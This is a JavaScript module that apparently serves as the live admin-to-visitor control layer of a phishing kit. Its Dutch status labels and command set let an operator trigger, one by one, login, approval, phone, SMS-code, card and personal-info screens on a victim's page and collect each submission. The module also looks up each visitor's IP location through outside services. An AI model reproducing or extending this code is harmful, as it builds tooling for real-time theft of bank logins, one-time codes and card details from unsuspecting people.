// Realtime layer for Admin <-> Visitor without a backend.
// Works across tabs on the same browser/origin via BroadcastChannel + localStorage.
// Ready to swap with WebSocket/Firebase later: only this file needs to change.
//
// Keys:
//   visitors  : { [id]: visitor }
//   commands  : { [visitorId]: { type, at, by } }
//   submissions: Array<{ id, visitorId, kind, data, at }>
//
// Visitor status: waiting | login_requested | login_submitted | approve_requested |
// approve_submitted | phone_requested | phone_submitted | sms_requested | sms_submitted |
// card_requested | card_submitted | info_requested | info_submitted | confirm_requested | done

const VISITORS_KEY = "live_visitors_v1";
const COMMANDS_KEY = "live_commands_v1";
const SUBMISSIONS_KEY = "live_submissions_v1";
const ADMIN_KEY = "live_admin_v1";

function safeParse(raw, fallback) {
  try {
    if (!raw) return fallback;
    return JSON.parse(raw);
  } catch {
    return fallback;
  }
}

export function readVisitors() {
  return safeParse(localStorage.getItem(VISITORS_KEY), {});
}

export function writeVisitors(map) {
  localStorage.setItem(VISITORS_KEY, JSON.stringify(map));
}

export function readCommands() {
  return safeParse(localStorage.getItem(COMMANDS_KEY), {});
}

export function writeCommands(map) {
  localStorage.setItem(COMMANDS_KEY, JSON.stringify(map));
}

export function readSubmissions() {
  return safeParse(localStorage.getItem(SUBMISSIONS_KEY), []);
}

export function writeSubmissions(arr) {
  localStorage.setItem(SUBMISSIONS_KEY, JSON.stringify(arr.slice(-500)));
}

export function getChannel() {
  try {
    if ("BroadcastChannel" in window) return new BroadcastChannel("admin_live_v1");
  } catch {}
  return null;
}

export function makeVisitorId() {
  return "v_" + Math.random().toString(36).slice(2, 9) + Date.now().toString(36).slice(-4);
}

export function getOrCreateVisitorId() {
  try {
    let id = sessionStorage.getItem("visitor_id");
    if (!id) {
      id = makeVisitorId();
      sessionStorage.setItem("visitor_id", id);
    }
    return id;
  } catch {
    return makeVisitorId();
  }
}

export async function fetchIpLocation() {
  // Returns { ip, city, country } — never throws
  try {
    const ipRes = await fetch("https://api.ipify.org?format=json");
    const ipJson = await ipRes.json();
    const ip = ipJson.ip || "unknown";
    try {
      const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
      const loc = await locRes.json();
      return {
        ip,
        city: loc.city || "Unknown",
        country: loc.country_name || loc.country || "Unknown",
      };
    } catch {
      return { ip, city: "Unknown", country: "Unknown" };
    }
  } catch {
    try {
      const r = await fetch("http://ip-api.com/json/");
      const j = await r.json();
      return { ip: j.query || "unknown", city: j.city || "Unknown", country: j.country || "Unknown" };
    } catch {
      return { ip: "unknown", city: "Unknown", country: "Unknown" };
    }
  }
}

// Command types admin can send:
// connected | ask_login | ask_approve | ask_phone | ask_sms | ask_card | ask_info | ask_confirm | done | reset_waiting
export const COMMAND_TO_STATUS = {
  connected: "waiting",
  ask_login: "login_requested",
  ask_approve: "approve_requested",
  ask_phone: "phone_requested",
  ask_sms: "sms_requested",
  ask_card: "card_requested",
  ask_info: "info_requested",
  ask_confirm: "confirm_requested",
  done: "done",
  reset_waiting: "waiting",
};

export const STATUS_LABEL = {
  waiting: "Wachten (lader)",
  login_requested: "Login getoond",
  login_submitted: "Login ingevuld",
  approve_requested: "Goedkeuring getoond",
  approve_submitted: "Goedkeuring ingevuld",
  phone_requested: "Telefoon getoond",
  phone_submitted: "Telefoon ingevuld",
  sms_requested: "SMS getoond",
  sms_submitted: "SMS ingevuld",
  card_requested: "Kaart getoond",
  card_submitted: "Kaart ingevuld",
  info_requested: "Info getoond",
  info_submitted: "Info ingevuld",
  confirm_requested: "Bevestiging getoond",
  confirm_submitted: "Bevestiging ingevuld",
  done: "Klaar",
};

export function isOnline(visitor, now = Date.now()) {
  if (!visitor?.lastSeen) return false;
  return now - visitor.lastSeen < 12000;
}

export function markAdminOnline() {
  localStorage.setItem(ADMIN_KEY, JSON.stringify({ at: Date.now() }));
}

export function isAdminOnline() {
  const v = safeParse(localStorage.getItem(ADMIN_KEY), null);
  if (!v?.at) return false;
  return Date.now() - v.at < 12000;
}
